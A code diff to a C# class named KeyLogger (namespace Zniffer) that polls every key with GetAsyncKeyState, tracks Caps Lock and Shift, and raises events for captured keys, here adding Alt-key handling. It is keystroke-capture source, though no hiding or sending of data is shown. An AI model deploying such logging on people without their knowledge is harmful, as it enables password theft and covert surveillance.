@@ -2,7 +2,8 @@
 using System.Text;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
-
+using System.Windows.Input;
+using System.ComponentModel;
 
 namespace Zniffer {
     class KeyLogger {
@@ -50,9 +51,6 @@ namespace Zniffer {
 
             foreach (System.Int32 i in Enum.GetValues(typeof(Keys))) {
                 if (GetAsyncKeyState(i) == -32767) {
-                    KeysConverter kc = new KeysConverter();
-                    string keyChar = kc.ConvertToString(i);
-
                     bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                     bool NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;
 
@@ -65,6 +63,7 @@ namespace Zniffer {
 
                     if ((CapsLock || ShiftKeyActive) && !(CapsLock && ShiftKeyActive))
                         shift = true;
+
 
                     if (Enum.GetName(typeof(Keys), i) == "LButton")
                         RaiseKeyCapturedEvent("<LMouse>");
@@ -120,12 +119,24 @@ namespace Zniffer {
                         RaiseKeyCapturedEvent("<Scroll>");
                     else if (Enum.GetName(typeof(Keys), i) == "Escape")
                         RaiseKeyCapturedEvent("<Escape>");
+                    else if (Enum.GetName(typeof(Keys), i) == "LMenu")
+                        RaiseKeyCapturedEvent("<LeftAlt>");
+                    else if (Enum.GetName(typeof(Keys), i) == "Menu")
+                        RaiseKeyCapturedEvent("<Alt>");
+                    else if (Enum.GetName(typeof(Keys), i) == "RMenu")
+                        RaiseKeyCapturedEvent("<RightAlt>");
                     else {
-                        if (!shift) { 
+                        KeysConverter kc = new KeysConverter();
+                        string keyChar = kc.ConvertToString(i);
+
+
+                        //RaiseKeyCapturedEvent(keyChar);
+
+
+                        if (!shift) {
                             keyChar = keyChar.ToLower();
 
-                        }
-                        else {
+                        } else {
                             keyChar = keyChar.ToUpper();
                             //oemminus//oemplus//oemminus//oemplus//divide//multiply//subtract//add
 
